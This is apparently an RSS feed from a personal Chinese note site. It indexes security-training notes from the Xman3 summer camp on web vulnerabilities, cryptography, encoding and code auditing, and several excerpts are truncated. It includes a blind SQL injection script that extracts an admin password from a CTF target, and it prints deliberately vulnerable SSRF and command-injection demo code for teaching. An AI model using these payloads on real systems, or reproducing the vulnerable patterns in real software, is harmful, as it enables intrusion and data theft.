<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Xman3夏令营 on shesl-meow's note site</title><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/</link><description>Recent content in Xman3夏令营 on shesl-meow's note site</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><atom:link href="http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/</guid><description>漏洞挖掘 # XSS # XSS自动化挖掘。重点在于输入与输出。 SQl注入 # Cookie、header、url、请求参数中均有可能触发。 PS：mysql常见的延时注入的函数：sleep、benchmark（重复执行同一个函数） sql注入的关键：如何闭合sql语句 SSRF与URL跳转 # 大部分SSRF、URL跳转漏洞触发在请求参数中。 redis是支持内网的常见服务，可以利用dict与gopher协议与之通信。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/</guid><description>Https下的Web同源安全问题研究 # XSS # Cookie基础 → 同源策略 # Cookie SOP相比Web SOP： 仅以domain/path作为同源限制 不区分端口 不区分HTTP/HTTPs 下午 # CRLF注入 # \r\n分割 Web Server的运行方式 # Apache # 默认prefork mode 同一个连接用同一个进程处理 mod_php Nginx # event-driven 同一个连接请求用不同的线程处理 php-fpm php disabled function绕过 # /proc/self/mem → 可以修改当前进程的内存 修改got 命令执行！ 访问头 # X-Forwarded-For 很多程序员用X-Forward-For来获取用户IP 在HTTP请求头中可以伪造 响应头 # X-XSS-Protection 一定程度上禁止反射性XSS攻击</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day15/</guid><description>无线攻防 # Fake AP #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day2/</guid><description>MISC # 0x00: Recon # 信息搜集 → 社会工程学 0x01: Encode # What is encoding? (From Stack-Overflow) The only thing that a computer can store is bytes. To store anything in a computer, you must first encode it. An encoding is a format to represent audio, images, text, etc in bytes. 二进制编码 # Python中与二进制相关的类型转化：
二进制字符串与十进制整型变量的相互转化：
dec_integer = int(&amp;#39;110&amp;#39;,2) # or &amp;#39;0b110&amp;#39; bin_integer = bin(6) # 类似的 hex(6)可以转化为16进制 PS：Python3中有Bytes类型的概念，可以用于做不同字符串编码格式的中介，比如：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day3/</guid><description>密码学Day1 # 密码学简介 # 一般来说，密码学的设计者根本目标是保障信息以及信息系统的以下几个方面的特性： 机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）、认证性（Authentication）、不可否认性（Non-repudiation） 前三者又被称为信息安全的CIA三要素 一般来说，我们都会假设攻击者已知待破解的密码体制，而攻击类型通常分为以下四种： 唯密文攻击：只拥有密文 已知明文攻击：拥有密文与对应的明文 选择明文攻击：拥有加密权限，能够对明文加密后获得相应密文 选择密文攻击：拥有解密权限，能够对密文解密后获得响应明文 古典密码 # 单表代换加密 # 一般有以下两种方式来进行破解： 在密钥空间较小的情况下，采用暴力破解的方式。 在密文长度足够长的时候使用词频分析。 分类：凯撒密码、移位密码、AtbashCipher、简单替换密码、仿射密码。下面关于仿射密码： 仿射密码 # 仿射密码的加密函数是：$$ E(x) = (ax+b) \mod m $$。其中： x 表示明文按照某种编码得到的数字 。 a与m互质。 m是编码系统中字母的数目。 仿射密码的解密函数是：$$ D(x) = a^{-1}*(x-b) \mod m $$。其中： $$a^{-1}$$ 是 a 在群 $$\mathbb{Z}_{m}$$ 的乘法逆元。 多表代换加密 # Polybius（棋盘密码） → 将给定的明文加密为两两组合的数字。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day4/</guid><description>密码学Day2 # 模数攻击 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day5/</guid><description>Web Day1 # 所需知识 # HTTP抓包/修改：Http请求、响应流程
web前端：Cookie、缓存、跨域问题、编码（url编码、html实体编码、js编码）
web后端：php → 官方文档；Python → 廖雪峰Python教程
数据库与服务器
常见的web漏洞：XSS、SQL注入、CSRF、SSRF、命令执行、XXE、文件上传/包含/写入、反序列化、未授权访问、目录遍历、业务逻辑漏洞
工具：Sqlmap、Burpsuit、Hackbar、Proxy SwitchyOme、Postman&amp;hellip;
Http请求 # Http请求响应 # 请求包格式 → 请求头格式：请求方法 + url/path + 协议版本 GET请求 → 从指定的资源请求数据 → 可以被缓存，有长度限制 POST请求 → 向指定的资源提交要被处理的数据 → 不会被缓存，没有长度限制 响应包 → 响应头：响应协议+状态码；响应主体：html代码 PHP后端获取请求头：$_SERVER['HTPP_USER_AGENT'] 常见请求头说明： Content-Length：请求长度，为了告诉服务器有多长（有时没有，使用一些分隔符指明长度） 题目类型 # 入门题目</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day6/</guid><description>Web Day2 # sql注入 # sql盲注脚本
import requests import re import sys p = re.compile(r&amp;#39;&amp;#39;&amp;#39;ID: (.+?)&amp;amp;nbspx:&amp;#39;&amp;#39;&amp;#39;) ans = &amp;#39;&amp;#39; for pos in range(1,33): l = 0 r = 127 cookies = {&amp;#34;PHPSESSID&amp;#34;:&amp;#34;tf7511brt2272n9ne5i8dj6o35&amp;#34;} data = {&amp;#34;x&amp;#34;: &amp;#34;1&amp;#34;, &amp;#34;y&amp;#34;: &amp;#34;1&amp;#34;} while l&amp;lt;r: mid = int((l+r)/2) resp = requests.post( &amp;#34;https://web.ctflearn.com/grid/controller.php?action=add_point&amp;#34;, data=data, cookies=cookies).text resp = requests.get(&amp;#34;https://web.ctflearn.com/grid/&amp;#34;, cookies=cookies).text _id = p.search(resp).group(1) payload = _id + &amp;#39; and ord(mid((select password from user where username=&amp;#34;admin&amp;#34; limit 0, 1), &amp;#39; + str(pos) + &amp;#39;,1))&amp;gt;&amp;#39; + str(mid) length = len(payload) resp = requests.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day7/</guid><description>Web服务器端安全 # 前置知识 # Http协议 # url说明 协议 http + 用户密码 user@pass +ip地址 127.0.0.1 + 端口port 8080 + 页面 index.php + 参数 ?id=123 + 锚点 #123 Http(s)协议：URL、HOST、User-Agent、Referer（代表跳转来源 → 可以用与做流量统计）、Cookie（反序列化）、X-Forwarded-For SQL注入 # 根本原因：脚本语言无法理解SQL语句，对查询语句处理不一致，导致SQL注入，篡改了SQL语句原本逻辑 SQL注入防御 # 字符串拼接形式：过滤单引号、双引号、反斜杠等关键词；转义(addslashes、mysqli_real_escape_string) 变量绑定，先给sql查询变量一个占位符，然后调用mysql的库进行预编译。 String sql = &amp;#34;select id, no from user where id=?&amp;#34;; PrepareStatement ps = conn.prepareStatement(sql); ps.SetInt(1, id); ps.executeQuery(); SQL注入类型 # Union注入</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day8/</guid><description>代码审计 # PHP代码审计 # 什么是代码审计：是指对源代码进行检查，寻找代码的bug，这里主要寻找可以导致安全漏洞的bug 代码审计的技巧（程序的两大根本：变量与函数）： 根据敏感的关键字回溯参数的传递过程 查找可控变量，正向追踪变量的传递过程 查找敏感功能点，通读功能点代码 直接通读全文代码 自动化审计工具：Seay（PHP代码审计工具）、Cobra、Fortify SCA&amp;hellip; SSRF漏洞 # SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。 常见后端实现 # 可以进行SSRF的常见后端实现：
使用file_get_content()，从用户指定的url获取图片，并把他保存下来： &amp;lt;?php if(isset($_POST[&amp;#39;url&amp;#39;])){ $$content = file_get_contents($$_POST[&amp;#39;url&amp;#39;]); $filename = &amp;#39;./images/&amp;#39;.rand().&amp;#39;;img1.jpg&amp;#39;; file_put_contents($$filename, $$content); echo $_POST[&amp;#39;url&amp;#39;]; $$img = &amp;#34;&amp;lt;img src=\&amp;#34;&amp;#34;.$$filename.&amp;#34;\&amp;#34;/&amp;gt;&amp;#34;; } echo $img; ?&amp;gt;使用fsockopen()函数 → 这个函数会利用socket跟服务器建立TCP连接，传输用户指定的url数据数据： &amp;lt;?php function GetFile($$host, $port, $$link){ $$fp = fsockopen($host, intval($host), $errno, $$errstr, 30); if(!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day9/</guid><description>Python代码审计 # OS命令注入 # 与OS命令注入攻击相关的模块：eval()、os.system()、os.popen*、subprocess.popenos.spawn*、commands.*、popen2.*。
下面是一个用Python中Django写的，可以利用eval命令注入的简单Python Web服务的Demo： def eval_test(request): if request.method == &amp;#39;GET&amp;#39;: return render_to_response(&amp;#39;eval.html&amp;#39;,context_instance=RequesetContext(request)) elif request.method == &amp;#39;POST&amp;#39;: domain = request.POST.get(&amp;#39;domain&amp;#39;,&amp;#39;&amp;#39;) command = &amp;#34;os.popen(&amp;#39;whois&amp;#34; + domain + &amp;#34;&amp;#39;)&amp;#34; output = eval(command) return render_to_response(&amp;#39;eval.html&amp;#39;, {&amp;#39;output&amp;#39;:output.readlines()}, context_instance=RequestContext(request)) OS命令注入：subprocess.call函数（shell=True时，函数会在命令前添加-c选项）。开发建议 → 使用pipes.quote()函数去过滤用户输入；尽量不要使用shell=True&amp;hellip; subprocess.call(&amp;#34;cat &amp;#34; + user_input, shell=True) subprocess.call(&amp;#34;cat %s&amp;#34;%(user_input), shell=True) subprocess.call(&amp;#34;cat {0}&amp;#34;.format(user_input), shell=True) 简单练习 # @app.route(&amp;#34;/eval/&amp;#34;) def eval_test(): ip = request.args.get(&amp;#39;ip&amp;#39;, &amp;#39;127.0.0.1&amp;#39;) output = os.</description></item></channel></rss>